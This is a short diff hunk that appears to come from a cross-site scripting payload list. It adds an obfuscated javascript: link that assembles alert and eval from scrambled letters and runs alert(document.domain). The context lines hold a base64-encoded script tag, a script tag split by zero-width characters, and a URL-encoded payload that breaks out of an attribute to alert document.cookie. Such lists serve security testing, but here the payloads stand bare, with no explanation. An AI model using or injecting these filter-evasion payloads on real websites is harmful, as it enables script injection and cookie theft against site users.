@@ -1,3 +1,4 @@
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(document.domain)" />click 
 PHNjcmlwdD5hbGVydCgiZG9jdW1lbnQuZG9tYWluIik8L3NjcmlwdD4=
 <​script>alert(String.fromCharCode(79,80,69,78,66,85,71,66,79,85,78,84,89))<​/script>
 ax6zt%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3Ey6uu6
